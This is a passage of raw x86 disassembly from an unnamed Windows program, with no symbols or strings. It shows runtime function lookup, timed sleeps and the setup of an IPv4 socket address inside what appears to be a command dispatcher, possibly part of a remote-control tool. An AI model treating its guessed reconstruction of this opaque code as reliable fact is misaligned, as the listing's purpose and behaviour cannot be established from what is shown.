  406a9e:	e8 bc b0 ff ff       	call   0x401b5f
  406aa3:	50                   	push   %eax
  406aa4:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  406aaa:	50                   	push   %eax
  406aab:	e8 4a 48 00 00       	call   0x40b2fa
  406ab0:	59                   	pop    %ecx
  406ab1:	59                   	pop    %ecx
  406ab2:	8b c8                	mov    %eax,%ecx
  406ab4:	ff 15 98 d2 40 00    	call   *0x40d298
  406aba:	33 db                	xor    %ebx,%ebx
  406abc:	50                   	push   %eax
  406abd:	53                   	push   %ebx
  406abe:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406ac1:	e8 99 b0 ff ff       	call   0x401b5f
  406ac6:	83 ec 10             	sub    $0x10,%esp
  406ac9:	8b cc                	mov    %esp,%ecx
  406acb:	50                   	push   %eax
  406acc:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406ad2:	e8 77 fa ff ff       	call   0x40654e
  406ad7:	83 c4 10             	add    $0x10,%esp
  406ada:	50                   	push   %eax
  406adb:	e8 13 f6 ff ff       	call   0x4060f3
  406ae0:	83 c4 14             	add    $0x14,%esp
  406ae3:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  406ae9:	88 45 ff             	mov    %al,-0x1(%ebp)
  406aec:	ff 15 9c d2 40 00    	call   *0x40d29c
  406af2:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  406af8:	e9 8e 00 00 00       	jmp    0x406b8b
  406afd:	56                   	push   %esi
  406afe:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406b01:	e8 59 b0 ff ff       	call   0x401b5f
  406b06:	8b c8                	mov    %eax,%ecx
  406b08:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  406b0e:	ff 30                	push   (%eax)
  406b10:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406b13:	6a 02                	push   $0x2
  406b15:	e8 45 b0 ff ff       	call   0x401b5f
  406b1a:	50                   	push   %eax
  406b1b:	8d 45 ac             	lea    -0x54(%ebp),%eax
  406b1e:	50                   	push   %eax
  406b1f:	e8 d6 47 00 00       	call   0x40b2fa
  406b24:	59                   	pop    %ecx
  406b25:	59                   	pop    %ecx
  406b26:	8b c8                	mov    %eax,%ecx
  406b28:	ff 15 98 d2 40 00    	call   *0x40d298
  406b2e:	50                   	push   %eax
  406b2f:	6a 01                	push   $0x1
  406b31:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406b34:	e8 26 b0 ff ff       	call   0x401b5f
  406b39:	50                   	push   %eax
  406b3a:	8d 85 1c ff ff ff    	lea    -0xe4(%ebp),%eax
  406b40:	50                   	push   %eax
  406b41:	e8 b4 47 00 00       	call   0x40b2fa
  406b46:	59                   	pop    %ecx
  406b47:	59                   	pop    %ecx
  406b48:	8b c8                	mov    %eax,%ecx
  406b4a:	ff 15 98 d2 40 00    	call   *0x40d298
  406b50:	33 db                	xor    %ebx,%ebx
  406b52:	50                   	push   %eax
  406b53:	53                   	push   %ebx
  406b54:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406b57:	e8 03 b0 ff ff       	call   0x401b5f
  406b5c:	83 ec 10             	sub    $0x10,%esp
  406b5f:	8b cc                	mov    %esp,%ecx
  406b61:	50                   	push   %eax
  406b62:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406b68:	e8 e1 f9 ff ff       	call   0x40654e
  406b6d:	83 c4 10             	add    $0x10,%esp
  406b70:	50                   	push   %eax
  406b71:	e8 38 f5 ff ff       	call   0x4060ae
  406b76:	83 c4 10             	add    $0x10,%esp
  406b79:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  406b7f:	88 45 ff             	mov    %al,-0x1(%ebp)
  406b82:	ff 15 9c d2 40 00    	call   *0x40d29c
  406b88:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  406b8b:	ff 15 9c d2 40 00    	call   *0x40d29c
  406b91:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  406b94:	74 65                	je     0x406bfb
  406b96:	83 ec 10             	sub    $0x10,%esp
  406b99:	8d 45 e5             	lea    -0x1b(%ebp),%eax
  406b9c:	8b cc                	mov    %esp,%ecx
  406b9e:	50                   	push   %eax
  406b9f:	68 f0 dc 40 00       	push   $0x40dcf0
  406ba4:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  406baa:	6a 72                	push   $0x72
  406bac:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  406bb1:	e8 74 a5 ff ff       	call   0x40112a
  406bb6:	53                   	push   %ebx
  406bb7:	6a 01                	push   $0x1
  406bb9:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406bbc:	e8 9e af ff ff       	call   0x401b5f
  406bc1:	50                   	push   %eax
  406bc2:	8d 45 8c             	lea    -0x74(%ebp),%eax
  406bc5:	50                   	push   %eax
  406bc6:	e8 2f 47 00 00       	call   0x40b2fa
  406bcb:	59                   	pop    %ecx
  406bcc:	59                   	pop    %ecx
  406bcd:	8b c8                	mov    %eax,%ecx
  406bcf:	ff 15 98 d2 40 00    	call   *0x40d298
  406bd5:	50                   	push   %eax
  406bd6:	53                   	push   %ebx
  406bd7:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406bda:	e8 80 af ff ff       	call   0x401b5f
  406bdf:	83 ec 10             	sub    $0x10,%esp
  406be2:	8b cc                	mov    %esp,%ecx
  406be4:	50                   	push   %eax
  406be5:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406beb:	e8 f7 f9 ff ff       	call   0x4065e7
  406bf0:	83 c4 18             	add    $0x18,%esp
  406bf3:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  406bf6:	e9 ef 02 00 00       	jmp    0x406eea
  406bfb:	83 ec 10             	sub    $0x10,%esp
  406bfe:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406c01:	8b cc                	mov    %esp,%ecx
  406c03:	50                   	push   %eax
  406c04:	68 ec dc 40 00       	push   $0x40dcec
  406c09:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  406c0f:	6a 72                	push   $0x72
  406c11:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  406c16:	e8 0f a5 ff ff       	call   0x40112a
  406c1b:	e9 d0 02 00 00       	jmp    0x406ef0
  406c20:	6a 01                	push   $0x1
  406c22:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406c25:	e8 35 af ff ff       	call   0x401b5f
  406c2a:	50                   	push   %eax
  406c2b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406c2e:	50                   	push   %eax
  406c2f:	e8 c6 46 00 00       	call   0x40b2fa
  406c34:	59                   	pop    %ecx
  406c35:	59                   	pop    %ecx
  406c36:	68 dc dc 40 00       	push   $0x40dcdc
  406c3b:	68 d0 dc 40 00       	push   $0x40dcd0
  406c40:	ff 15 24 d1 40 00    	call   *0x40d124
  406c46:	50                   	push   %eax
  406c47:	ff 15 28 d1 40 00    	call   *0x40d128
  406c4d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406c50:	a3 2c 1b 41 00       	mov    %eax,0x411b2c
  406c55:	ff 15 98 d2 40 00    	call   *0x40d298
  406c5b:	33 db                	xor    %ebx,%ebx
  406c5d:	50                   	push   %eax
  406c5e:	53                   	push   %ebx
  406c5f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406c62:	e8 f8 ae ff ff       	call   0x401b5f
  406c67:	83 ec 10             	sub    $0x10,%esp
  406c6a:	8b cc                	mov    %esp,%ecx
  406c6c:	50                   	push   %eax
  406c6d:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406c73:	e8 d6 f8 ff ff       	call   0x40654e
  406c78:	83 c4 10             	add    $0x10,%esp
  406c7b:	50                   	push   %eax
  406c7c:	ff 15 2c 1b 41 00    	call   *0x411b2c
  406c82:	3b c3                	cmp    %ebx,%eax
  406c84:	0f 85 b8 00 00 00    	jne    0x406d42
  406c8a:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406c8d:	ff 15 38 d2 40 00    	call   *0x40d238
  406c93:	48                   	dec    %eax
  406c94:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406c97:	48                   	dec    %eax
  406c98:	50                   	push   %eax
  406c99:	68 f8 d6 40 00       	push   $0x40d6f8
  406c9e:	ff 15 c8 d1 40 00    	call   *0x40d1c8
  406ca4:	8b f0                	mov    %eax,%esi
  406ca6:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  406cab:	3b 30                	cmp    (%eax),%esi
  406cad:	75 21                	jne    0x406cd0
  406caf:	53                   	push   %ebx
  406cb0:	53                   	push   %ebx
  406cb1:	53                   	push   %ebx
  406cb2:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406cb5:	e8 a5 ae ff ff       	call   0x401b5f
  406cba:	83 ec 10             	sub    $0x10,%esp
  406cbd:	8b cc                	mov    %esp,%ecx
  406cbf:	50                   	push   %eax
  406cc0:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406cc6:	e8 1c f9 ff ff       	call   0x4065e7
  406ccb:	83 c4 18             	add    $0x18,%esp
  406cce:	eb 62                	jmp    0x406d32
  406cd0:	8d 44 36 02          	lea    0x2(%esi,%esi,1),%eax
  406cd4:	50                   	push   %eax
  406cd5:	e8 56 57 00 00       	call   0x40c430
  406cda:	59                   	pop    %ecx
  406cdb:	8b f8                	mov    %eax,%edi
  406cdd:	56                   	push   %esi
  406cde:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  406ce4:	53                   	push   %ebx
  406ce5:	50                   	push   %eax
  406ce6:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406ce9:	ff 15 3c d2 40 00    	call   *0x40d23c
  406cef:	8b c8                	mov    %eax,%ecx
  406cf1:	ff 15 98 d2 40 00    	call   *0x40d298
  406cf7:	50                   	push   %eax
  406cf8:	57                   	push   %edi
  406cf9:	ff 15 3c d3 40 00    	call   *0x40d33c
  406cff:	59                   	pop    %ecx
  406d00:	59                   	pop    %ecx
  406d01:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  406d07:	ff 15 9c d2 40 00    	call   *0x40d29c
  406d0d:	53                   	push   %ebx
  406d0e:	57                   	push   %edi
  406d0f:	53                   	push   %ebx
  406d10:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406d13:	e8 47 ae ff ff       	call   0x401b5f
  406d18:	83 ec 10             	sub    $0x10,%esp
  406d1b:	8b cc                	mov    %esp,%ecx
  406d1d:	50                   	push   %eax
  406d1e:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406d24:	e8 be f8 ff ff       	call   0x4065e7
  406d29:	57                   	push   %edi
  406d2a:	e8 c3 56 00 00       	call   0x40c3f2
  406d2f:	83 c4 1c             	add    $0x1c,%esp
  406d32:	83 ec 10             	sub    $0x10,%esp
  406d35:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406d38:	8b cc                	mov    %esp,%ecx
  406d3a:	50                   	push   %eax
  406d3b:	68 cc dc 40 00       	push   $0x40dccc
  406d40:	eb 0e                	jmp    0x406d50
  406d42:	83 ec 10             	sub    $0x10,%esp
  406d45:	8d 45 eb             	lea    -0x15(%ebp),%eax
  406d48:	8b cc                	mov    %esp,%ecx
  406d4a:	50                   	push   %eax
  406d4b:	68 c8 dc 40 00       	push   $0x40dcc8
  406d50:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  406d56:	6a 72                	push   $0x72
  406d58:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  406d5d:	e8 c8 a3 ff ff       	call   0x40112a
  406d62:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406d65:	e9 80 01 00 00       	jmp    0x406eea
  406d6a:	6a 02                	push   $0x2
  406d6c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406d6f:	e8 eb ad ff ff       	call   0x401b5f
  406d74:	50                   	push   %eax
  406d75:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  406d7b:	50                   	push   %eax
  406d7c:	e8 79 45 00 00       	call   0x40b2fa
  406d81:	59                   	pop    %ecx
  406d82:	59                   	pop    %ecx
  406d83:	8b c8                	mov    %eax,%ecx
  406d85:	ff 15 98 d2 40 00    	call   *0x40d298
  406d8b:	50                   	push   %eax
  406d8c:	6a 01                	push   $0x1
  406d8e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406d91:	e8 c9 ad ff ff       	call   0x401b5f
  406d96:	50                   	push   %eax
  406d97:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  406d9d:	50                   	push   %eax
  406d9e:	e8 57 45 00 00       	call   0x40b2fa
  406da3:	59                   	pop    %ecx
  406da4:	59                   	pop    %ecx
  406da5:	8b c8                	mov    %eax,%ecx
  406da7:	ff 15 98 d2 40 00    	call   *0x40d298
  406dad:	33 db                	xor    %ebx,%ebx
  406daf:	50                   	push   %eax
  406db0:	53                   	push   %ebx
  406db1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406db4:	e8 a6 ad ff ff       	call   0x401b5f
  406db9:	83 ec 10             	sub    $0x10,%esp
  406dbc:	8b cc                	mov    %esp,%ecx
  406dbe:	50                   	push   %eax
  406dbf:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406dc5:	e8 84 f7 ff ff       	call   0x40654e
  406dca:	83 c4 10             	add    $0x10,%esp
  406dcd:	50                   	push   %eax
  406dce:	e8 c8 f3 ff ff       	call   0x40619b
  406dd3:	83 c4 0c             	add    $0xc,%esp
  406dd6:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  406ddc:	88 45 ff             	mov    %al,-0x1(%ebp)
  406ddf:	ff 15 9c d2 40 00    	call   *0x40d29c
  406de5:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  406deb:	ff 15 9c d2 40 00    	call   *0x40d29c
  406df1:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  406df4:	74 6b                	je     0x406e61
  406df6:	83 ec 10             	sub    $0x10,%esp
  406df9:	8d 45 ea             	lea    -0x16(%ebp),%eax
  406dfc:	8b cc                	mov    %esp,%ecx
  406dfe:	50                   	push   %eax
  406dff:	68 20 d6 40 00       	push   $0x40d620
  406e04:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  406e0a:	6a 72                	push   $0x72
  406e0c:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  406e11:	e8 14 a3 ff ff       	call   0x40112a
  406e16:	53                   	push   %ebx
  406e17:	6a 01                	push   $0x1
  406e19:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406e1c:	e8 3e ad ff ff       	call   0x401b5f
  406e21:	50                   	push   %eax
  406e22:	8d 85 0c ff ff ff    	lea    -0xf4(%ebp),%eax
  406e28:	50                   	push   %eax
  406e29:	e8 cc 44 00 00       	call   0x40b2fa
  406e2e:	59                   	pop    %ecx
  406e2f:	59                   	pop    %ecx
  406e30:	8b c8                	mov    %eax,%ecx
  406e32:	ff 15 98 d2 40 00    	call   *0x40d298
  406e38:	50                   	push   %eax
  406e39:	53                   	push   %ebx
  406e3a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406e3d:	e8 1d ad ff ff       	call   0x401b5f
  406e42:	83 ec 10             	sub    $0x10,%esp
  406e45:	8b cc                	mov    %esp,%ecx
  406e47:	50                   	push   %eax
  406e48:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406e4e:	e8 94 f7 ff ff       	call   0x4065e7
  406e53:	83 c4 18             	add    $0x18,%esp
  406e56:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  406e5c:	e9 89 00 00 00       	jmp    0x406eea
  406e61:	83 ec 10             	sub    $0x10,%esp
  406e64:	8d 45 e9             	lea    -0x17(%ebp),%eax
  406e67:	8b cc                	mov    %esp,%ecx
  406e69:	50                   	push   %eax
  406e6a:	68 30 dc 40 00       	push   $0x40dc30
  406e6f:	e9 95 fd ff ff       	jmp    0x406c09
  406e74:	8d 45 e7             	lea    -0x19(%ebp),%eax
  406e77:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406e7a:	50                   	push   %eax
  406e7b:	ff 15 20 d2 40 00    	call   *0x40d220
  406e81:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406e84:	e8 06 ad ff ff       	call   0x401b8f
  406e89:	83 f8 01             	cmp    $0x1,%eax
  406e8c:	76 2f                	jbe    0x406ebd
  406e8e:	6a 01                	push   $0x1
  406e90:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406e93:	e8 c7 ac ff ff       	call   0x401b5f
  406e98:	50                   	push   %eax
  406e99:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  406e9f:	50                   	push   %eax
  406ea0:	e8 55 44 00 00       	call   0x40b2fa
  406ea5:	59                   	pop    %ecx
  406ea6:	59                   	pop    %ecx
  406ea7:	50                   	push   %eax
  406ea8:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406eab:	ff 15 50 d2 40 00    	call   *0x40d250
  406eb1:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  406eb7:	ff 15 9c d2 40 00    	call   *0x40d29c
  406ebd:	6a 01                	push   $0x1
  406ebf:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406ec2:	ff 15 98 d2 40 00    	call   *0x40d298
  406ec8:	50                   	push   %eax
  406ec9:	6a 00                	push   $0x0
  406ecb:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406ece:	e8 8c ac ff ff       	call   0x401b5f
  406ed3:	83 ec 10             	sub    $0x10,%esp
  406ed6:	8b cc                	mov    %esp,%ecx
  406ed8:	50                   	push   %eax
  406ed9:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406edf:	e8 03 f7 ff ff       	call   0x4065e7
  406ee4:	83 c4 18             	add    $0x18,%esp
  406ee7:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406eea:	ff 15 9c d2 40 00    	call   *0x40d29c
  406ef0:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406ef3:	e8 38 ac ff ff       	call   0x401b30
  406ef8:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  406efb:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406f01:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  406f04:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406f0a:	5f                   	pop    %edi
  406f0b:	5e                   	pop    %esi
  406f0c:	33 c0                	xor    %eax,%eax
  406f0e:	5b                   	pop    %ebx
  406f0f:	c9                   	leave
  406f10:	c3                   	ret
  406f11:	55                   	push   %ebp
  406f12:	8b ec                	mov    %esp,%ebp
  406f14:	53                   	push   %ebx
  406f15:	bb e8 1a 41 00       	mov    $0x411ae8,%ebx
  406f1a:	56                   	push   %esi
  406f1b:	57                   	push   %edi
  406f1c:	8b cb                	mov    %ebx,%ecx
  406f1e:	e8 7d a1 ff ff       	call   0x4010a0
  406f23:	83 ec 10             	sub    $0x10,%esp
  406f26:	be 78 11 41 00       	mov    $0x411178,%esi
  406f2b:	8b fc                	mov    %esp,%edi
  406f2d:	8b cb                	mov    %ebx,%ecx
  406f2f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406f30:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406f31:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406f32:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406f33:	e8 cb a1 ff ff       	call   0x401103
  406f38:	83 ec 10             	sub    $0x10,%esp
  406f3b:	8d 45 08             	lea    0x8(%ebp),%eax
  406f3e:	8b cc                	mov    %esp,%ecx
  406f40:	50                   	push   %eax
  406f41:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406f47:	6a 2f                	push   $0x2f
  406f49:	8b cb                	mov    %ebx,%ecx
  406f4b:	e8 da a1 ff ff       	call   0x40112a
  406f50:	6a 00                	push   $0x0
  406f52:	68 bf 67 40 00       	push   $0x4067bf
  406f57:	8b cb                	mov    %ebx,%ecx
  406f59:	e8 53 a2 ff ff       	call   0x4011b1
  406f5e:	8d 4d 08             	lea    0x8(%ebp),%ecx
  406f61:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406f67:	5f                   	pop    %edi
  406f68:	5e                   	pop    %esi
  406f69:	5b                   	pop    %ebx
  406f6a:	5d                   	pop    %ebp
  406f6b:	c3                   	ret
  406f6c:	e8 05 00 00 00       	call   0x406f76
  406f71:	e9 0d 00 00 00       	jmp    0x406f83
  406f76:	6a 00                	push   $0x0
  406f78:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  406f7d:	e8 f6 a0 ff ff       	call   0x401078
  406f82:	c3                   	ret
  406f83:	68 8f 6f 40 00       	push   $0x406f8f
  406f88:	e8 2b 54 00 00       	call   0x40c3b8
  406f8d:	59                   	pop    %ecx
  406f8e:	c3                   	ret
  406f8f:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  406f94:	e9 d2 a1 ff ff       	jmp    0x40116b
  406f99:	e8 05 00 00 00       	call   0x406fa3
  406f9e:	e9 15 00 00 00       	jmp    0x406fb8
  406fa3:	55                   	push   %ebp
  406fa4:	8b ec                	mov    %esp,%ebp
  406fa6:	51                   	push   %ecx
  406fa7:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406faa:	b9 60 1b 41 00       	mov    $0x411b60,%ecx
  406faf:	50                   	push   %eax
  406fb0:	ff 15 dc d2 40 00    	call   *0x40d2dc
  406fb6:	c9                   	leave
  406fb7:	c3                   	ret
  406fb8:	68 c4 6f 40 00       	push   $0x406fc4
  406fbd:	e8 f6 53 00 00       	call   0x40c3b8
  406fc2:	59                   	pop    %ecx
  406fc3:	c3                   	ret
  406fc4:	b9 60 1b 41 00       	mov    $0x411b60,%ecx
  406fc9:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  406fcf:	55                   	push   %ebp
  406fd0:	8b ec                	mov    %esp,%ebp
  406fd2:	81 ec f8 07 00 00    	sub    $0x7f8,%esp
  406fd8:	53                   	push   %ebx
  406fd9:	56                   	push   %esi
  406fda:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  406fe0:	57                   	push   %edi
  406fe1:	50                   	push   %eax
  406fe2:	e8 2e 3f 00 00       	call   0x40af15
  406fe7:	59                   	pop    %ecx
  406fe8:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406feb:	50                   	push   %eax
  406fec:	8d 8d f0 fb ff ff    	lea    -0x410(%ebp),%ecx
  406ff2:	ff 15 dc d2 40 00    	call   *0x40d2dc
  406ff8:	be 20 1a 41 00       	mov    $0x411a20,%esi
  406ffd:	6a 29                	push   $0x29
  406fff:	8b ce                	mov    %esi,%ecx
  407001:	e8 59 ab ff ff       	call   0x401b5f
  407006:	8b c8                	mov    %eax,%ecx
  407008:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40700e:	50                   	push   %eax
  40700f:	ff 15 58 d3 40 00    	call   *0x40d358
  407015:	33 ff                	xor    %edi,%edi
  407017:	59                   	pop    %ecx
  407018:	3b c7                	cmp    %edi,%eax
  40701a:	74 0d                	je     0x407029
  40701c:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
  407022:	50                   	push   %eax
  407023:	ff 15 94 d1 40 00    	call   *0x40d194
  407029:	83 ec 10             	sub    $0x10,%esp
  40702c:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40702f:	8b cc                	mov    %esp,%ecx
  407031:	50                   	push   %eax
  407032:	68 28 dc 40 00       	push   $0x40dc28
  407037:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40703d:	57                   	push   %edi
  40703e:	8b ce                	mov    %esi,%ecx
  407040:	e8 1a ab ff ff       	call   0x401b5f
  407045:	83 ec 10             	sub    $0x10,%esp
  407048:	8b cc                	mov    %esp,%ecx
  40704a:	50                   	push   %eax
  40704b:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  407051:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  407054:	50                   	push   %eax
  407055:	e8 93 43 00 00       	call   0x40b3ed
  40705a:	83 c4 24             	add    $0x24,%esp
  40705d:	89 7d f8             	mov    %edi,-0x8(%ebp)
  407060:	89 7d f4             	mov    %edi,-0xc(%ebp)
  407063:	bb 68 11 41 00       	mov    $0x411168,%ebx
  407068:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  40706d:	e8 2e a0 ff ff       	call   0x4010a0
  407072:	83 ec 10             	sub    $0x10,%esp
  407075:	8d 45 ff             	lea    -0x1(%ebp),%eax
  407078:	8b cc                	mov    %esp,%ecx
  40707a:	be 50 dd 40 00       	mov    $0x40dd50,%esi
  40707f:	50                   	push   %eax
  407080:	56                   	push   %esi
  407081:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  407087:	ff 75 f8             	push   -0x8(%ebp)
  40708a:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40708d:	e8 cd aa ff ff       	call   0x401b5f
  407092:	83 ec 10             	sub    $0x10,%esp
  407095:	8b cc                	mov    %esp,%ecx
  407097:	50                   	push   %eax
  407098:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40709e:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4070a1:	50                   	push   %eax
  4070a2:	e8 46 43 00 00       	call   0x40b3ed
  4070a7:	83 c4 24             	add    $0x24,%esp
  4070aa:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  4070ad:	7d 0d                	jge    0x4070bc
  4070af:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4070b2:	e8 d8 aa ff ff       	call   0x401b8f
  4070b7:	83 f8 01             	cmp    $0x1,%eax
  4070ba:	76 7e                	jbe    0x40713a
  4070bc:	6a 01                	push   $0x1
  4070be:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4070c1:	e8 99 aa ff ff       	call   0x401b5f
  4070c6:	83 ec 10             	sub    $0x10,%esp
  4070c9:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4070cc:	8b d4                	mov    %esp,%edx
  4070ce:	50                   	push   %eax
  4070cf:	56                   	push   %esi
  4070d0:	57                   	push   %edi
  4070d1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4070d4:	e8 86 aa ff ff       	call   0x401b5f
  4070d9:	50                   	push   %eax
  4070da:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
  4070e0:	68 40 dd 40 00       	push   $0x40dd40
  4070e5:	50                   	push   %eax
  4070e6:	e8 d9 55 00 00       	call   0x40c6c4
  4070eb:	83 c4 0c             	add    $0xc,%esp
  4070ee:	50                   	push   %eax
  4070ef:	8d 85 30 fe ff ff    	lea    -0x1d0(%ebp),%eax
  4070f5:	50                   	push   %eax
  4070f6:	e8 a5 55 00 00       	call   0x40c6a0
  4070fb:	83 c4 0c             	add    $0xc,%esp
  4070fe:	50                   	push   %eax
  4070ff:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407102:	50                   	push   %eax
  407103:	e8 b0 55 00 00       	call   0x40c6b8
  407108:	51                   	push   %ecx
  407109:	8d 45 e7             	lea    -0x19(%ebp),%eax
  40710c:	8b cc                	mov    %esp,%ecx
  40710e:	50                   	push   %eax
  40710f:	68 18 d5 40 00       	push   $0x40d518
  407114:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40711a:	e8 d1 3a 00 00       	call   0x40abf0
  40711f:	83 c4 20             	add    $0x20,%esp
  407122:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  407128:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40712e:	8d 8d 10 fc ff ff    	lea    -0x3f0(%ebp),%ecx
  407134:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40713a:	57                   	push   %edi
  40713b:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40713e:	66 c7 05 78 11 41 00 	movw   $0x2,0x411178
  407145:	02 00 
  407147:	e8 13 aa ff ff       	call   0x401b5f
  40714c:	8b c8                	mov    %eax,%ecx
  40714e:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  407154:	50                   	push   %eax
  407155:	e8 b8 55 00 00       	call   0x40c712
  40715a:	3b c7                	cmp    %edi,%eax
  40715c:	75 35                	jne    0x407193
  40715e:	83 ec 10             	sub    $0x10,%esp
  407161:	8d 45 ef             	lea    -0x11(%ebp),%eax
  407164:	8b cc                	mov    %esp,%ecx
  407166:	50                   	push   %eax
  407167:	68 2c dd 40 00       	push   $0x40dd2c
  40716c:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  407172:	83 ec 10             	sub    $0x10,%esp
  407175:	8d 45 ed             	lea    -0x13(%ebp),%eax
  407178:	8b cc                	mov    %esp,%ecx
  40717a:	50                   	push   %eax
  40717b:	68 8c d6 40 00       	push   $0x40d68c
  407180:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  407186:	e8 65 3a 00 00       	call   0x40abf0
  40718b:	83 c4 20             	add    $0x20,%esp
  40718e:	e9 78 08 00 00       	jmp    0x407a0b
  407193:	0f bf 48 0a          	movswl 0xa(%eax),%ecx
  407197:	8b 40 0c             	mov    0xc(%eax),%eax
  40719a:	bf 7c 11 41 00       	mov    $0x41117c,%edi
  40719f:	6a 01                	push   $0x1
  4071a1:	8b 30                	mov    (%eax),%esi
  4071a3:	8b c1                	mov    %ecx,%eax
  4071a5:	c1 e9 02             	shr    $0x2,%ecx
  4071a8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4071aa:	8b c8                	mov    %eax,%ecx
  4071ac:	83 e1 03             	and    $0x3,%ecx
  4071af:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4071b1:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4071b4:	e8 a6 a9 ff ff       	call   0x401b5f
